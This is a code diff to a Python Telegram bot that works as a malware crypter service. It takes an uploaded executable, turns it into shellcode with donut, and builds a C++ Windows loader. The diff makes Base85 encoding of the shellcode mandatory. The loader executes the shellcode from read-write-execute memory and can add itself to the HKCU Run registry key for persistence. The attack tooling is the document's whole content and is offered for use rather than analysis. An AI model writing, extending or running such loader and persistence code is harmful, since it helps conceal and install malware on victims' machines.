@@ -299,7 +299,7 @@ async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # Conversation states
-GET_FILENAME, GET_B85_CHOICE, GET_STARTUP_CHOICE = range(3)
+GET_FILENAME, GET_STARTUP_CHOICE = range(2)
 
 async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the initial file upload and starts the conversation."""
@@ -341,37 +341,15 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     return GET_FILENAME
 
+import base64
+
 async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the desired filename and asks about base85 initialization."""
+    """Stores the desired filename and asks about startup persistence."""
     filename = update.message.text
     if not filename.lower().endswith('.exe'):
         filename += '.exe'
 
     context.user_data['output_filename'] = filename
-
-    keyboard = [
-        [
-            InlineKeyboardButton("Yes", callback_data="b85_yes"),
-            InlineKeyboardButton("No", callback_data="b85_no"),
-        ]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        "Filename saved. Enable Base85 initialization? (This will encode the shellcode)",
-        reply_markup=reply_markup
-    )
-
-    return GET_B85_CHOICE
-
-import base64
-
-async def get_b85_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the Base85 choice and asks about startup."""
-    query = update.callback_query
-    await query.answer()
-
-    context.user_data['use_b85'] = query.data == 'b85_yes'
 
     keyboard = [
         [
@@ -381,21 +359,19 @@ async def get_b85_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    await edit_message(
-        query,
-        "Should the file be added to startup for persistence?",
-        reply_markup
+    await update.message.reply_text(
+        "Filename saved. Should the file be added to startup for persistence?",
+        reply_markup=reply_markup
     )
 
     return GET_STARTUP_CHOICE
 
 async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the startup choice, compiles, sends, cleans up, and ends."""
+    """Stores the startup choice, compiles with Base85, sends, cleans up, and ends."""
     query = update.callback_query
     await query.answer()
 
     startup = query.data == 'startup_yes'
-    use_b85 = context.user_data.get('use_b85', False)
 
     input_path = context.user_data.get('input_path')
     output_filename = context.user_data.get('output_filename')
@@ -414,16 +390,14 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await edit_message(query, "Processing your file... This may take a moment.", None)
 
         shellcode_bytes = donut.create(file=input_path)
+        encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')
         app_name_for_registry = os.path.splitext(output_filename)[0]
 
         startup_line = ""
         if startup:
             startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
 
-        cpp_template = ""
-        if use_b85:
-            encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')
-            cpp_template = f'''
+        cpp_template = f'''
 #include <windows.h>
 #include <string.h>
 #include <vector>
@@ -480,36 +454,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (exec != NULL) {{
         memcpy(exec, shellcode.data(), shellcode.size());
-        ((void(*)())exec)();
-    }}
-    return 0;
-}}
-'''
-        else:
-            shellcode_formatted = ', '.join([f'0x{b:02x}' for b in shellcode_bytes])
-            cpp_template = f'''
-#include <windows.h>
-#include <string.h>
-
-void addToStartup(const char* appName, const char* appPath) {{
-    HKEY hKey;
-    const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, runKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
-        RegSetValueEx(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, strlen(appPath) + 1);
-        RegCloseKey(hKey);
-    }}
-}}
-
-unsigned char shellcode[] = {{
-  {shellcode_formatted}
-}};
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
-    {startup_line}
-
-    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (exec != NULL) {{
-        memcpy(exec, shellcode, sizeof(shellcode));
         ((void(*)())exec)();
     }}
     return 0;
@@ -574,7 +518,6 @@ def main():
         entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
         states={
             GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
-            GET_B85_CHOICE: [CallbackQueryHandler(get_b85_choice)],
             GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
